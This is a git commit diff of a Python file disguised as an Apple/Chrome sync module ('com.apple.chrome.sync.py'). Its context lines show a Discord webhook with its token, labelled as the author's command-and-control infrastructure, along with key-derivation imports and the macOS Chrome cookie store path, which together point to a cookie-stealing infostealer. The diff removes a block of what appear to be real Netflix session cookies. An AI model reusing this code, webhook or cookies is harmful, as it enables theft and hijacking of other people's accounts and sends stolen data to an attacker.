7b66db1b9b11411258884223f555f8ed41f4b19d
Souhail Lassoued <76921303+souhail-lass@users.noreply.github.com>
2026-04-15 19:22:15 -0400

    Update com.apple.chrome.sync.py

--- com.apple.chrome.sync.py
+++ com.apple.chrome.sync.py
@@ -12,15 +12,7 @@ from Cryptodome.Protocol.KDF import PBKDF2
 # --- SURGICAL CONFIGURATION ---
 # Remplace avec ton infrastructure C2
 DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1494109026298888273/Ynr2dafzmUxTWd2F0kJSBKeDh87L2XCmFpp48Kbc2YMx6aGNJzEqAr7MEd8CqCv0wjyy"
-NETFLIX_COOKIE_VAL = ".netflix.com	TRUE	/	FALSE	1775696549	flwssn	243e003a-793a-4cd6-a736-ba7f059401a5
-.netflix.com	TRUE	/	TRUE	1775772149	gsid	6acf3bc3-0cc1-47e2-95b4-f2728d710759
-.netflix.com	TRUE	/	TRUE	1791237772	SecureNetflixId	v%3D3%26mac%3DAQEAEQABABRoiytqQ1o194iYIsgv1YQZcLH-oOvQMWw.%26dt%3D1775685768056
-.netflix.com	TRUE	/	TRUE	1791237772	NetflixId	v%3D3%26ct%3DBgjHlOvcAxKqA3MynVSeUTBWDox7qa8S55vRXOrqV-sFFSmNrp1hFH5yz2-xdoNUlMGmfxgyeD7zqpCGQ5bU0oWPDztZaKWSJyuBjUPBMQ7hBrW2iRUaZpeDME4I-1iTmNFCJb9CEy4tkYUc6p3InlmCpAGr38ewpC-8UI3qGlrTkRVWmtnuLVq_ROF7X1oPQtxsfViDg4DvnMduQIKXdFyYl3iuTEp-Ym0eEDrYEZXaVSoiQefX04OLTWz1Uze3b7K62J2LPErqWcQyeCn-yavihPKXfnK3vvtGf1xGKW1N7rsSGl6fs6Qw6iiPvmbsmW4Cx6qqCjvLTZ5OcGs6bagAyFyFS-e0QfAdOZ-J5TpEKYqcMtolHX20DIAzRHlprnwoziSrmmlE3cptNy9G7b_9S1UVNgYT60BukB8ET2vd3HOcTFSxc2AJM86F2M9GgAZkYkV19eyTOhHDBYT4wR9M8aR7ATD08U8dsi4oKcD6Ft6QjMy6iCi2yBViEJOkpISBZO3jSdkvChi6VPY8gZR_nuPQ2zkxhiNley6BBY2-INrDcsjbNrgMCQokinv5Z6P8QRgGIg4KDGSVpPthzx00S67ElA..%26pg%3DC4INRNPO6VAPHDOYH33XGTCCPE%26ch%3DAQEAEAABABR_8gOgj8_fvRi8RA8rAMS1r0XgPnZ0m0g.
-.netflix.com	TRUE	/	FALSE	1783461787	netflix-sans-bold-3-loaded	true
-.netflix.com	TRUE	/	FALSE	1791237772	nfvdid	BQFmAAEBELixFf8q5B8xsoexlflf8fdgZt7GYuA2h_URRe0D7c8MoRN8iW9d2VnFAEZpiVKmbKJZkyBCEoHCZnuigB8z544gD5snpiBLSHuMtIP_FU0HXVQL3OC7Kc08jMgtHOMbnjB0JcLwfszBsbMHfdlIKLOB
-.netflix.com	TRUE	/	FALSE	1775695365	profilesNewSession	0
-.netflix.com	TRUE	/	FALSE	1783461787	netflix-sans-normal-3-loaded	true    
-"
+NETFLIX_COOKIE_VAL = "243e003a-793a-4cd6-a736-ba7f059401a5"
 
 # Paths dynamiques pour macOS
 CHROME_PATH = os.path.expanduser("~/Library/Application Support/Google/Chrome/Default/Cookies")
